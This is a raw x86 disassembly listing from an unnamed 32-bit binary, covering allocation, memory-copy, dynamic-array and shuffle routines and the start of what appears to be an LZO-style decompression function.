10009f29:	e8 b6 ca ff ff       	call   0x100069e4
10009f2e:	59                   	pop    %ecx
10009f2f:	89 46 30             	mov    %eax,0x30(%esi)
10009f32:	85 c0                	test   %eax,%eax
10009f34:	74 17                	je     0x10009f4d
10009f36:	57                   	push   %edi
10009f37:	ff 75 08             	pushl  0x8(%ebp)
10009f3a:	50                   	push   %eax
10009f3b:	e8 d0 3d 00 00       	call   0x1000dd10
10009f40:	89 7e 38             	mov    %edi,0x38(%esi)
10009f43:	83 c4 0c             	add    $0xc,%esp
10009f46:	8b fe                	mov    %esi,%edi
10009f48:	e8 70 00 00 00       	call   0x10009fbd
10009f4d:	5f                   	pop    %edi
10009f4e:	5e                   	pop    %esi
10009f4f:	5d                   	pop    %ebp
10009f50:	c2 04 00             	ret    $0x4
10009f53:	55                   	push   %ebp
10009f54:	8b ec                	mov    %esp,%ebp
10009f56:	81 ec 28 01 00 00    	sub    $0x128,%esp
10009f5c:	56                   	push   %esi
10009f5d:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
10009f63:	e8 80 f1 ff ff       	call   0x100090e8
10009f68:	59                   	pop    %ecx
10009f69:	6a 10                	push   $0x10
10009f6b:	8d 46 20             	lea    0x20(%esi),%eax
10009f6e:	50                   	push   %eax
10009f6f:	8d 45 f0             	lea    -0x10(%ebp),%eax
10009f72:	50                   	push   %eax
10009f73:	e8 98 3d 00 00       	call   0x1000dd10
10009f78:	8b 46 30             	mov    0x30(%esi),%eax
10009f7b:	8b 4e 34             	mov    0x34(%esi),%ecx
10009f7e:	83 c4 0c             	add    $0xc,%esp
10009f81:	50                   	push   %eax
10009f82:	50                   	push   %eax
10009f83:	8d 45 f0             	lea    -0x10(%ebp),%eax
10009f86:	50                   	push   %eax
10009f87:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
10009f8d:	6a 00                	push   $0x0
10009f8f:	50                   	push   %eax
10009f90:	e8 71 fb ff ff       	call   0x10009b06
10009f95:	83 c4 14             	add    $0x14,%esp
10009f98:	f7 d8                	neg    %eax
10009f9a:	1b c0                	sbb    %eax,%eax
10009f9c:	40                   	inc    %eax
10009f9d:	c9                   	leave  
10009f9e:	c3                   	ret    
10009f9f:	56                   	push   %esi
10009fa0:	8b f0                	mov    %eax,%esi
10009fa2:	6a 20                	push   $0x20
10009fa4:	56                   	push   %esi
10009fa5:	e8 dd ba ff ff       	call   0x10005a87
10009faa:	6a 10                	push   $0x10
10009fac:	83 c6 20             	add    $0x20,%esi
10009faf:	56                   	push   %esi
10009fb0:	e8 d2 ba ff ff       	call   0x10005a87
10009fb5:	83 c4 10             	add    $0x10,%esp
10009fb8:	33 c0                	xor    %eax,%eax
10009fba:	40                   	inc    %eax
10009fbb:	5e                   	pop    %esi
10009fbc:	c3                   	ret    
10009fbd:	55                   	push   %ebp
10009fbe:	8b ec                	mov    %esp,%ebp
10009fc0:	83 e4 f8             	and    $0xfffffff8,%esp
10009fc3:	81 ec 2c 01 00 00    	sub    $0x12c,%esp
10009fc9:	56                   	push   %esi
10009fca:	8b c7                	mov    %edi,%eax
10009fcc:	33 f6                	xor    %esi,%esi
10009fce:	e8 cc ff ff ff       	call   0x10009f9f
10009fd3:	85 c0                	test   %eax,%eax
10009fd5:	74 3d                	je     0x1000a014
10009fd7:	57                   	push   %edi
10009fd8:	8d 44 24 1c          	lea    0x1c(%esp),%eax
10009fdc:	e8 c1 ee ff ff       	call   0x10008ea2
10009fe1:	6a 10                	push   $0x10
10009fe3:	8d 47 20             	lea    0x20(%edi),%eax
10009fe6:	50                   	push   %eax
10009fe7:	8d 44 24 14          	lea    0x14(%esp),%eax
10009feb:	50                   	push   %eax
10009fec:	e8 1f 3d 00 00       	call   0x1000dd10
10009ff1:	8b 47 30             	mov    0x30(%edi),%eax
10009ff4:	8b 4f 34             	mov    0x34(%edi),%ecx
10009ff7:	50                   	push   %eax
10009ff8:	50                   	push   %eax
10009ff9:	8d 44 24 20          	lea    0x20(%esp),%eax
10009ffd:	50                   	push   %eax
10009ffe:	8d 44 24 34          	lea    0x34(%esp),%eax
1000a002:	6a 01                	push   $0x1
1000a004:	50                   	push   %eax
1000a005:	e8 fc fa ff ff       	call   0x10009b06
1000a00a:	83 c4 24             	add    $0x24,%esp
1000a00d:	8b f0                	mov    %eax,%esi
1000a00f:	f7 de                	neg    %esi
1000a011:	1b f6                	sbb    %esi,%esi
1000a013:	46                   	inc    %esi
1000a014:	8b c6                	mov    %esi,%eax
1000a016:	5e                   	pop    %esi
1000a017:	8b e5                	mov    %ebp,%esp
1000a019:	5d                   	pop    %ebp
1000a01a:	c3                   	ret    
1000a01b:	55                   	push   %ebp
1000a01c:	8b ec                	mov    %esp,%ebp
1000a01e:	83 e4 f8             	and    $0xfffffff8,%esp
1000a021:	56                   	push   %esi
1000a022:	8b f1                	mov    %ecx,%esi
1000a024:	57                   	push   %edi
1000a025:	3b 46 38             	cmp    0x38(%esi),%eax
1000a028:	73 04                	jae    0x1000a02e
1000a02a:	33 c0                	xor    %eax,%eax
1000a02c:	eb 24                	jmp    0x1000a052
1000a02e:	e8 20 ff ff ff       	call   0x10009f53
1000a033:	85 c0                	test   %eax,%eax
1000a035:	74 18                	je     0x1000a04f
1000a037:	ff 76 38             	pushl  0x38(%esi)
1000a03a:	ff 76 30             	pushl  0x30(%esi)
1000a03d:	ff 75 08             	pushl  0x8(%ebp)
1000a040:	e8 cb 3c 00 00       	call   0x1000dd10
1000a045:	83 c4 0c             	add    $0xc,%esp
1000a048:	8b fe                	mov    %esi,%edi
1000a04a:	e8 6e ff ff ff       	call   0x10009fbd
1000a04f:	8b 46 38             	mov    0x38(%esi),%eax
1000a052:	5f                   	pop    %edi
1000a053:	5e                   	pop    %esi
1000a054:	8b e5                	mov    %ebp,%esp
1000a056:	5d                   	pop    %ebp
1000a057:	c2 04 00             	ret    $0x4
1000a05a:	83 7e 38 00          	cmpl   $0x0,0x38(%esi)
1000a05e:	74 09                	je     0x1000a069
1000a060:	ff 76 30             	pushl  0x30(%esi)
1000a063:	e8 ab c9 ff ff       	call   0x10006a13
1000a068:	59                   	pop    %ecx
1000a069:	83 66 38 00          	andl   $0x0,0x38(%esi)
1000a06d:	83 66 30 00          	andl   $0x0,0x30(%esi)
1000a071:	83 66 34 00          	andl   $0x0,0x34(%esi)
1000a075:	c3                   	ret    
1000a076:	55                   	push   %ebp
1000a077:	8b ec                	mov    %esp,%ebp
1000a079:	ff 75 0c             	pushl  0xc(%ebp)
1000a07c:	6b c9 3c             	imul   $0x3c,%ecx,%ecx
1000a07f:	03 4d 08             	add    0x8(%ebp),%ecx
1000a082:	e8 82 fe ff ff       	call   0x10009f09
1000a087:	5d                   	pop    %ebp
1000a088:	c2 08 00             	ret    $0x8
1000a08b:	55                   	push   %ebp
1000a08c:	8b ec                	mov    %esp,%ebp
1000a08e:	ff 75 0c             	pushl  0xc(%ebp)
1000a091:	6b c9 3c             	imul   $0x3c,%ecx,%ecx
1000a094:	03 4d 08             	add    0x8(%ebp),%ecx
1000a097:	e8 7f ff ff ff       	call   0x1000a01b
1000a09c:	5d                   	pop    %ebp
1000a09d:	c2 08 00             	ret    $0x8
1000a0a0:	53                   	push   %ebx
1000a0a1:	56                   	push   %esi
1000a0a2:	8b f0                	mov    %eax,%esi
1000a0a4:	32 db                	xor    %bl,%bl
1000a0a6:	57                   	push   %edi
1000a0a7:	8b f9                	mov    %ecx,%edi
1000a0a9:	85 f6                	test   %esi,%esi
1000a0ab:	75 14                	jne    0x1000a0c1
1000a0ad:	6a 10                	push   $0x10
1000a0af:	e8 30 c9 ff ff       	call   0x100069e4
1000a0b4:	8b f0                	mov    %eax,%esi
1000a0b6:	fe c3                	inc    %bl
1000a0b8:	59                   	pop    %ecx
1000a0b9:	85 f6                	test   %esi,%esi
1000a0bb:	75 04                	jne    0x1000a0c1
1000a0bd:	33 c0                	xor    %eax,%eax
1000a0bf:	eb 2d                	jmp    0x1000a0ee
1000a0c1:	89 3e                	mov    %edi,(%esi)
1000a0c3:	c1 e7 07             	shl    $0x7,%edi
1000a0c6:	57                   	push   %edi
1000a0c7:	e8 18 c9 ff ff       	call   0x100069e4
1000a0cc:	59                   	pop    %ecx
1000a0cd:	89 46 04             	mov    %eax,0x4(%esi)
1000a0d0:	85 c0                	test   %eax,%eax
1000a0d2:	75 0d                	jne    0x1000a0e1
1000a0d4:	84 db                	test   %bl,%bl
1000a0d6:	74 e5                	je     0x1000a0bd
1000a0d8:	56                   	push   %esi
1000a0d9:	e8 35 c9 ff ff       	call   0x10006a13
1000a0de:	59                   	pop    %ecx
1000a0df:	eb dc                	jmp    0x1000a0bd
1000a0e1:	83 66 0c 00          	andl   $0x0,0xc(%esi)
1000a0e5:	c7 46 08 80 00 00 00 	movl   $0x80,0x8(%esi)
1000a0ec:	8b c6                	mov    %esi,%eax
1000a0ee:	5f                   	pop    %edi
1000a0ef:	5e                   	pop    %esi
1000a0f0:	5b                   	pop    %ebx
1000a0f1:	c3                   	ret    
1000a0f2:	85 c0                	test   %eax,%eax
1000a0f4:	74 04                	je     0x1000a0fa
1000a0f6:	8b 40 0c             	mov    0xc(%eax),%eax
1000a0f9:	c3                   	ret    
1000a0fa:	33 c0                	xor    %eax,%eax
1000a0fc:	c3                   	ret    
1000a0fd:	8b 06                	mov    (%esi),%eax
1000a0ff:	57                   	push   %edi
1000a100:	8b 7e 08             	mov    0x8(%esi),%edi
1000a103:	03 ff                	add    %edi,%edi
1000a105:	0f af c7             	imul   %edi,%eax
1000a108:	50                   	push   %eax
1000a109:	ff 76 04             	pushl  0x4(%esi)
1000a10c:	e8 e9 c8 ff ff       	call   0x100069fa
1000a111:	59                   	pop    %ecx
1000a112:	59                   	pop    %ecx
1000a113:	85 c0                	test   %eax,%eax
1000a115:	74 06                	je     0x1000a11d
1000a117:	89 46 04             	mov    %eax,0x4(%esi)
1000a11a:	89 7e 08             	mov    %edi,0x8(%esi)
1000a11d:	8b 46 08             	mov    0x8(%esi),%eax
1000a120:	5f                   	pop    %edi
1000a121:	c3                   	ret    
1000a122:	56                   	push   %esi
1000a123:	8b f0                	mov    %eax,%esi
1000a125:	85 f6                	test   %esi,%esi
1000a127:	75 05                	jne    0x1000a12e
1000a129:	83 c8 ff             	or     $0xffffffff,%eax
1000a12c:	5e                   	pop    %esi
1000a12d:	c3                   	ret    
1000a12e:	57                   	push   %edi
1000a12f:	8b 7e 08             	mov    0x8(%esi),%edi
1000a132:	39 7e 0c             	cmp    %edi,0xc(%esi)
1000a135:	72 09                	jb     0x1000a140
1000a137:	e8 c1 ff ff ff       	call   0x1000a0fd
1000a13c:	3b c7                	cmp    %edi,%eax
1000a13e:	76 09                	jbe    0x1000a149
1000a140:	ff 46 0c             	incl   0xc(%esi)
1000a143:	8b 46 0c             	mov    0xc(%esi),%eax
1000a146:	48                   	dec    %eax
1000a147:	eb 03                	jmp    0x1000a14c
1000a149:	83 c8 ff             	or     $0xffffffff,%eax
1000a14c:	5f                   	pop    %edi
1000a14d:	5e                   	pop    %esi
1000a14e:	c3                   	ret    
1000a14f:	55                   	push   %ebp
1000a150:	8b ec                	mov    %esp,%ebp
1000a152:	85 f6                	test   %esi,%esi
1000a154:	74 2f                	je     0x1000a185
1000a156:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
1000a15a:	74 29                	je     0x1000a185
1000a15c:	57                   	push   %edi
1000a15d:	8b c6                	mov    %esi,%eax
1000a15f:	e8 be ff ff ff       	call   0x1000a122
1000a164:	8b f8                	mov    %eax,%edi
1000a166:	83 ff ff             	cmp    $0xffffffff,%edi
1000a169:	74 15                	je     0x1000a180
1000a16b:	8b 06                	mov    (%esi),%eax
1000a16d:	50                   	push   %eax
1000a16e:	0f af c7             	imul   %edi,%eax
1000a171:	03 46 04             	add    0x4(%esi),%eax
1000a174:	ff 75 08             	pushl  0x8(%ebp)
1000a177:	50                   	push   %eax
1000a178:	e8 93 3b 00 00       	call   0x1000dd10
1000a17d:	83 c4 0c             	add    $0xc,%esp
1000a180:	8b c7                	mov    %edi,%eax
1000a182:	5f                   	pop    %edi
1000a183:	5d                   	pop    %ebp
1000a184:	c3                   	ret    
1000a185:	83 c8 ff             	or     $0xffffffff,%eax
1000a188:	5d                   	pop    %ebp
1000a189:	c3                   	ret    
1000a18a:	85 f6                	test   %esi,%esi
1000a18c:	74 3a                	je     0x1000a1c8
1000a18e:	8b 46 0c             	mov    0xc(%esi),%eax
1000a191:	3b d0                	cmp    %eax,%edx
1000a193:	73 33                	jae    0x1000a1c8
1000a195:	8d 48 ff             	lea    -0x1(%eax),%ecx
1000a198:	3b d1                	cmp    %ecx,%edx
1000a19a:	74 25                	je     0x1000a1c1
1000a19c:	8b 0e                	mov    (%esi),%ecx
1000a19e:	2b c2                	sub    %edx,%eax
1000a1a0:	48                   	dec    %eax
1000a1a1:	0f af c1             	imul   %ecx,%eax
1000a1a4:	57                   	push   %edi
1000a1a5:	8b 7e 04             	mov    0x4(%esi),%edi
1000a1a8:	50                   	push   %eax
1000a1a9:	8d 42 01             	lea    0x1(%edx),%eax
1000a1ac:	0f af c1             	imul   %ecx,%eax
1000a1af:	0f af ca             	imul   %edx,%ecx
1000a1b2:	03 c7                	add    %edi,%eax
1000a1b4:	50                   	push   %eax
1000a1b5:	03 cf                	add    %edi,%ecx
1000a1b7:	51                   	push   %ecx
1000a1b8:	e8 53 3b 00 00       	call   0x1000dd10
1000a1bd:	83 c4 0c             	add    $0xc,%esp
1000a1c0:	5f                   	pop    %edi
1000a1c1:	ff 4e 0c             	decl   0xc(%esi)
1000a1c4:	8b 46 0c             	mov    0xc(%esi),%eax
1000a1c7:	c3                   	ret    
1000a1c8:	83 c8 ff             	or     $0xffffffff,%eax
1000a1cb:	c3                   	ret    
1000a1cc:	85 c0                	test   %eax,%eax
1000a1ce:	74 04                	je     0x1000a1d4
1000a1d0:	83 60 0c 00          	andl   $0x0,0xc(%eax)
1000a1d4:	c3                   	ret    
1000a1d5:	55                   	push   %ebp
1000a1d6:	8b ec                	mov    %esp,%ebp
1000a1d8:	85 f6                	test   %esi,%esi
1000a1da:	74 1d                	je     0x1000a1f9
1000a1dc:	8b c6                	mov    %esi,%eax
1000a1de:	e8 e9 ff ff ff       	call   0x1000a1cc
1000a1e3:	ff 76 04             	pushl  0x4(%esi)
1000a1e6:	e8 28 c8 ff ff       	call   0x10006a13
1000a1eb:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
1000a1ef:	59                   	pop    %ecx
1000a1f0:	74 07                	je     0x1000a1f9
1000a1f2:	56                   	push   %esi
1000a1f3:	e8 1b c8 ff ff       	call   0x10006a13
1000a1f8:	59                   	pop    %ecx
1000a1f9:	5d                   	pop    %ebp
1000a1fa:	c3                   	ret    
1000a1fb:	55                   	push   %ebp
1000a1fc:	8b ec                	mov    %esp,%ebp
1000a1fe:	85 c0                	test   %eax,%eax
1000a200:	74 2d                	je     0x1000a22f
1000a202:	8b 48 0c             	mov    0xc(%eax),%ecx
1000a205:	39 4d 08             	cmp    %ecx,0x8(%ebp)
1000a208:	73 25                	jae    0x1000a22f
1000a20a:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
1000a20d:	73 20                	jae    0x1000a22f
1000a20f:	8b 08                	mov    (%eax),%ecx
1000a211:	56                   	push   %esi
1000a212:	8b 70 04             	mov    0x4(%eax),%esi
1000a215:	8b c1                	mov    %ecx,%eax
1000a217:	0f af 45 0c          	imul   0xc(%ebp),%eax
1000a21b:	8b d1                	mov    %ecx,%edx
1000a21d:	0f af 55 08          	imul   0x8(%ebp),%edx
1000a221:	03 c6                	add    %esi,%eax
1000a223:	03 d6                	add    %esi,%edx
1000a225:	e8 86 af ff ff       	call   0x100051b0
1000a22a:	b0 01                	mov    $0x1,%al
1000a22c:	5e                   	pop    %esi
1000a22d:	5d                   	pop    %ebp
1000a22e:	c3                   	ret    
1000a22f:	32 c0                	xor    %al,%al
1000a231:	5d                   	pop    %ebp
1000a232:	c3                   	ret    
1000a233:	55                   	push   %ebp
1000a234:	8b ec                	mov    %esp,%ebp
1000a236:	56                   	push   %esi
1000a237:	8b f0                	mov    %eax,%esi
1000a239:	85 f6                	test   %esi,%esi
1000a23b:	0f 84 80 00 00 00    	je     0x1000a2c1
1000a241:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
1000a245:	74 7a                	je     0x1000a2c1
1000a247:	8b 46 0c             	mov    0xc(%esi),%eax
1000a24a:	39 45 08             	cmp    %eax,0x8(%ebp)
1000a24d:	77 72                	ja     0x1000a2c1
1000a24f:	75 13                	jne    0x1000a264
1000a251:	ff 75 0c             	pushl  0xc(%ebp)
1000a254:	e8 f6 fe ff ff       	call   0x1000a14f
1000a259:	59                   	pop    %ecx
1000a25a:	33 c9                	xor    %ecx,%ecx
1000a25c:	83 f8 ff             	cmp    $0xffffffff,%eax
1000a25f:	0f 95 c0             	setne  %al
1000a262:	eb 5f                	jmp    0x1000a2c3
1000a264:	8b c6                	mov    %esi,%eax
1000a266:	e8 b7 fe ff ff       	call   0x1000a122
1000a26b:	83 f8 ff             	cmp    $0xffffffff,%eax
1000a26e:	74 51                	je     0x1000a2c1
1000a270:	57                   	push   %edi
1000a271:	8b 7e 0c             	mov    0xc(%esi),%edi
1000a274:	83 ef 02             	sub    $0x2,%edi
1000a277:	3b 7d 08             	cmp    0x8(%ebp),%edi
1000a27a:	72 2a                	jb     0x1000a2a6
1000a27c:	53                   	push   %ebx
1000a27d:	8d 5f 01             	lea    0x1(%edi),%ebx
1000a280:	8b 06                	mov    (%esi),%eax
1000a282:	8b 4e 04             	mov    0x4(%esi),%ecx
1000a285:	8b d0                	mov    %eax,%edx
1000a287:	0f af d7             	imul   %edi,%edx
1000a28a:	03 d1                	add    %ecx,%edx
1000a28c:	50                   	push   %eax
1000a28d:	52                   	push   %edx
1000a28e:	8b d3                	mov    %ebx,%edx
1000a290:	0f af d0             	imul   %eax,%edx
1000a293:	03 d1                	add    %ecx,%edx
1000a295:	52                   	push   %edx
1000a296:	e8 75 3a 00 00       	call   0x1000dd10
1000a29b:	83 c4 0c             	add    $0xc,%esp
1000a29e:	4f                   	dec    %edi
1000a29f:	4b                   	dec    %ebx
1000a2a0:	3b 7d 08             	cmp    0x8(%ebp),%edi
1000a2a3:	73 db                	jae    0x1000a280
1000a2a5:	5b                   	pop    %ebx
1000a2a6:	8b 06                	mov    (%esi),%eax
1000a2a8:	50                   	push   %eax
1000a2a9:	0f af 45 08          	imul   0x8(%ebp),%eax
1000a2ad:	03 46 04             	add    0x4(%esi),%eax
1000a2b0:	ff 75 0c             	pushl  0xc(%ebp)
1000a2b3:	50                   	push   %eax
1000a2b4:	e8 57 3a 00 00       	call   0x1000dd10
1000a2b9:	83 c4 0c             	add    $0xc,%esp
1000a2bc:	b0 01                	mov    $0x1,%al
1000a2be:	5f                   	pop    %edi
1000a2bf:	eb 02                	jmp    0x1000a2c3
1000a2c1:	32 c0                	xor    %al,%al
1000a2c3:	5e                   	pop    %esi
1000a2c4:	5d                   	pop    %ebp
1000a2c5:	c3                   	ret    
1000a2c6:	8b c6                	mov    %esi,%eax
1000a2c8:	c7 06 d0 ec 00 10    	movl   $0x1000ecd0,(%esi)
1000a2ce:	e8 25 00 00 00       	call   0x1000a2f8
1000a2d3:	88 46 04             	mov    %al,0x4(%esi)
1000a2d6:	8b c6                	mov    %esi,%eax
1000a2d8:	c3                   	ret    
1000a2d9:	55                   	push   %ebp
1000a2da:	8b ec                	mov    %esp,%ebp
1000a2dc:	56                   	push   %esi
1000a2dd:	8b f1                	mov    %ecx,%esi
1000a2df:	e8 26 00 00 00       	call   0x1000a30a
1000a2e4:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
1000a2e8:	74 07                	je     0x1000a2f1
1000a2ea:	56                   	push   %esi
1000a2eb:	e8 5d d9 ff ff       	call   0x10007c4d
1000a2f0:	59                   	pop    %ecx
1000a2f1:	8b c6                	mov    %esi,%eax
1000a2f3:	5e                   	pop    %esi
1000a2f4:	5d                   	pop    %ebp
1000a2f5:	c2 04 00             	ret    $0x4
1000a2f8:	6a 04                	push   $0x4
1000a2fa:	83 c0 08             	add    $0x8,%eax
1000a2fd:	59                   	pop    %ecx
1000a2fe:	e8 9d fd ff ff       	call   0x1000a0a0
1000a303:	f7 d8                	neg    %eax
1000a305:	1b c0                	sbb    %eax,%eax
1000a307:	f7 d8                	neg    %eax
1000a309:	c3                   	ret    
1000a30a:	80 79 04 00          	cmpb   $0x0,0x4(%ecx)
1000a30e:	c7 01 d0 ec 00 10    	movl   $0x1000ecd0,(%ecx)
1000a314:	74 0d                	je     0x1000a323
1000a316:	56                   	push   %esi
1000a317:	6a 00                	push   $0x0
1000a319:	8d 71 08             	lea    0x8(%ecx),%esi
1000a31c:	e8 b4 fe ff ff       	call   0x1000a1d5
1000a321:	59                   	pop    %ecx
1000a322:	5e                   	pop    %esi
1000a323:	c3                   	ret    
1000a324:	55                   	push   %ebp
1000a325:	8b ec                	mov    %esp,%ebp
1000a327:	56                   	push   %esi
1000a328:	8d 45 08             	lea    0x8(%ebp),%eax
1000a32b:	50                   	push   %eax
1000a32c:	8d 71 08             	lea    0x8(%ecx),%esi
1000a32f:	e8 1b fe ff ff       	call   0x1000a14f
1000a334:	59                   	pop    %ecx
1000a335:	33 c9                	xor    %ecx,%ecx
1000a337:	83 f8 ff             	cmp    $0xffffffff,%eax
1000a33a:	0f 95 c0             	setne  %al
1000a33d:	5e                   	pop    %esi
1000a33e:	5d                   	pop    %ebp
1000a33f:	c2 04 00             	ret    $0x4
1000a342:	55                   	push   %ebp
1000a343:	8b ec                	mov    %esp,%ebp
1000a345:	8d 45 0c             	lea    0xc(%ebp),%eax
1000a348:	50                   	push   %eax
1000a349:	ff 75 08             	pushl  0x8(%ebp)
1000a34c:	8d 41 08             	lea    0x8(%ecx),%eax
1000a34f:	e8 df fe ff ff       	call   0x1000a233
1000a354:	59                   	pop    %ecx
1000a355:	59                   	pop    %ecx
1000a356:	5d                   	pop    %ebp
1000a357:	c2 08 00             	ret    $0x8
1000a35a:	55                   	push   %ebp
1000a35b:	8b ec                	mov    %esp,%ebp
1000a35d:	8b 41 08             	mov    0x8(%ecx),%eax
1000a360:	0f af 45 08          	imul   0x8(%ebp),%eax
1000a364:	03 41 0c             	add    0xc(%ecx),%eax
1000a367:	5d                   	pop    %ebp
1000a368:	c2 04 00             	ret    $0x4
1000a36b:	55                   	push   %ebp
1000a36c:	8b ec                	mov    %esp,%ebp
1000a36e:	5d                   	pop    %ebp
1000a36f:	e9 e6 ff ff ff       	jmp    0x1000a35a
1000a374:	55                   	push   %ebp
1000a375:	8b ec                	mov    %esp,%ebp
1000a377:	ff 75 0c             	pushl  0xc(%ebp)
1000a37a:	83 c0 08             	add    $0x8,%eax
1000a37d:	ff 75 08             	pushl  0x8(%ebp)
1000a380:	e8 76 fe ff ff       	call   0x1000a1fb
1000a385:	59                   	pop    %ecx
1000a386:	59                   	pop    %ecx
1000a387:	5d                   	pop    %ebp
1000a388:	c2 08 00             	ret    $0x8
1000a38b:	56                   	push   %esi
1000a38c:	8d 70 08             	lea    0x8(%eax),%esi
1000a38f:	e8 f6 fd ff ff       	call   0x1000a18a
1000a394:	5e                   	pop    %esi
1000a395:	c3                   	ret    
1000a396:	83 c0 08             	add    $0x8,%eax
1000a399:	e9 2e fe ff ff       	jmp    0x1000a1cc
1000a39e:	83 c0 08             	add    $0x8,%eax
1000a3a1:	e9 4c fd ff ff       	jmp    0x1000a0f2
1000a3a6:	6a 30                	push   $0x30
1000a3a8:	e8 37 c6 ff ff       	call   0x100069e4
1000a3ad:	59                   	pop    %ecx
1000a3ae:	c3                   	ret    
1000a3af:	8a 41 04             	mov    0x4(%ecx),%al
1000a3b2:	c3                   	ret    
1000a3b3:	56                   	push   %esi
1000a3b4:	8b c7                	mov    %edi,%eax
1000a3b6:	33 f6                	xor    %esi,%esi
1000a3b8:	e8 e1 ff ff ff       	call   0x1000a39e
1000a3bd:	48                   	dec    %eax
1000a3be:	74 2e                	je     0x1000a3ee
1000a3c0:	53                   	push   %ebx
1000a3c1:	8b c7                	mov    %edi,%eax
1000a3c3:	e8 d6 ff ff ff       	call   0x1000a39e
1000a3c8:	8b d8                	mov    %eax,%ebx
1000a3ca:	e8 17 ae ff ff       	call   0x100051e6
1000a3cf:	33 d2                	xor    %edx,%edx
1000a3d1:	f7 f3                	div    %ebx
1000a3d3:	3b d6                	cmp    %esi,%edx
1000a3d5:	74 09                	je     0x1000a3e0
1000a3d7:	52                   	push   %edx
1000a3d8:	56                   	push   %esi
1000a3d9:	8b c7                	mov    %edi,%eax
1000a3db:	e8 94 ff ff ff       	call   0x1000a374
1000a3e0:	8b c7                	mov    %edi,%eax
1000a3e2:	46                   	inc    %esi
1000a3e3:	e8 b6 ff ff ff       	call   0x1000a39e
1000a3e8:	48                   	dec    %eax
1000a3e9:	3b f0                	cmp    %eax,%esi
1000a3eb:	72 d4                	jb     0x1000a3c1
1000a3ed:	5b                   	pop    %ebx
1000a3ee:	5e                   	pop    %esi
1000a3ef:	c3                   	ret    
1000a3f0:	55                   	push   %ebp
1000a3f1:	8b ec                	mov    %esp,%ebp
1000a3f3:	51                   	push   %ecx
1000a3f4:	8b 4d 10             	mov    0x10(%ebp),%ecx
1000a3f7:	8b 55 0c             	mov    0xc(%ebp),%edx
1000a3fa:	53                   	push   %ebx
1000a3fb:	56                   	push   %esi
1000a3fc:	57                   	push   %edi
1000a3fd:	8b 7d 08             	mov    0x8(%ebp),%edi
1000a400:	8d 1c 07             	lea    (%edi,%eax,1),%ebx
1000a403:	8b 01                	mov    (%ecx),%eax
1000a405:	83 21 00             	andl   $0x0,(%ecx)
1000a408:	03 c2                	add    %edx,%eax
1000a40a:	89 45 08             	mov    %eax,0x8(%ebp)
1000a40d:	8b c3                	mov    %ebx,%eax
1000a40f:	2b c7                	sub    %edi,%eax
1000a411:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000a414:	8b cf                	mov    %edi,%ecx
1000a416:	83 f8 01             	cmp    $0x1,%eax
1000a419:	0f 82 4d 03 00 00    	jb     0x1000a76c
1000a41f:	8a 07                	mov    (%edi),%al
1000a421:	3c 11                	cmp    $0x11,%al
1000a423:	76 3c                	jbe    0x1000a461
1000a425:	0f b6 f0             	movzbl %al,%esi
1000a428:	83 ee 11             	sub    $0x11,%esi
1000a42b:	8d 4f 01             	lea    0x1(%edi),%ecx
1000a42e:	83 fe 04             	cmp    $0x4,%esi
1000a431:	0f 82 35 01 00 00    	jb     0x1000a56c
1000a437:	8b 45 08             	mov    0x8(%ebp),%eax
1000a43a:	2b c2                	sub    %edx,%eax
1000a43c:	3b c6                	cmp    %esi,%eax
1000a43e:	0f 82 56 03 00 00    	jb     0x1000a79a
1000a444:	8b c3                	mov    %ebx,%eax
1000a446:	2b c1                	sub    %ecx,%eax
1000a448:	8d 7e 03             	lea    0x3(%esi),%edi
1000a44b:	3b c7                	cmp    %edi,%eax
1000a44d:	0f 82 19 03 00 00    	jb     0x1000a76c
1000a453:	8a 01                	mov    (%ecx),%al
1000a455:	88 02                	mov    %al,(%edx)
1000a457:	42                   	inc    %edx
1000a458:	41                   	inc    %ecx
1000a459:	4e                   	dec    %esi
1000a45a:	75 f7                	jne    0x1000a453
1000a45c:	e9 a4 00 00 00       	jmp    0x1000a505
1000a461:	8b c3                	mov    %ebx,%eax
1000a463:	2b c1                	sub    %ecx,%eax
1000a465:	83 f8 03             	cmp    $0x3,%eax
1000a468:	0f 82 fe 02 00 00    	jb     0x1000a76c
1000a46e:	0f b6 31             	movzbl (%ecx),%esi
1000a471:	41                   	inc    %ecx
1000a472:	83 fe 10             	cmp    $0x10,%esi
1000a475:	0f 83 2d 01 00 00    	jae    0x1000a5a8
1000a47b:	85 f6                	test   %esi,%esi
1000a47d:	75 2f                	jne    0x1000a4ae
1000a47f:	eb 20                	jmp    0x1000a4a1
1000a481:	81 c6 ff 00 00 00    	add    $0xff,%esi
1000a487:	41                   	inc    %ecx
1000a488:	81 fe 01 fe ff ff    	cmp    $0xfffffe01,%esi
1000a48e:	0f 87 d8 02 00 00    	ja     0x1000a76c
1000a494:	8b c3                	mov    %ebx,%eax
1000a496:	2b c1                	sub    %ecx,%eax
1000a498:	83 f8 01             	cmp    $0x1,%eax
1000a49b:	0f 82 cb 02 00 00    	jb     0x1000a76c
1000a4a1:	80 39 00             	cmpb   $0x0,(%ecx)
1000a4a4:	74 db                	je     0x1000a481
1000a4a6:	0f b6 01             	movzbl (%ecx),%eax
1000a4a9:	8d 74 06 0f          	lea    0xf(%esi,%eax,1),%esi
1000a4ad:	41                   	inc    %ecx
1000a4ae:	8b 45 08             	mov    0x8(%ebp),%eax
1000a4b1:	2b c2                	sub    %edx,%eax
1000a4b3:	8d 7e 03             	lea    0x3(%esi),%edi
1000a4b6:	3b c7                	cmp    %edi,%eax
1000a4b8:	0f 82 dc 02 00 00    	jb     0x1000a79a
1000a4be:	8b c3                	mov    %ebx,%eax
1000a4c0:	2b c1                	sub    %ecx,%eax
1000a4c2:	8d 7e 06             	lea    0x6(%esi),%edi
1000a4c5:	3b c7                	cmp    %edi,%eax
1000a4c7:	0f 82 9f 02 00 00    	jb     0x1000a76c
1000a4cd:	8b 01                	mov    (%ecx),%eax
1000a4cf:	89 02                	mov    %eax,(%edx)
1000a4d1:	6a 04                	push   $0x4
1000a4d3:	58                   	pop    %eax
1000a4d4:	03 d0                	add    %eax,%edx
1000a4d6:	03 c8                	add    %eax,%ecx
1000a4d8:	4e                   	dec    %esi
1000a4d9:	74 2a                	je     0x1000a505
1000a4db:	3b f0                	cmp    %eax,%esi
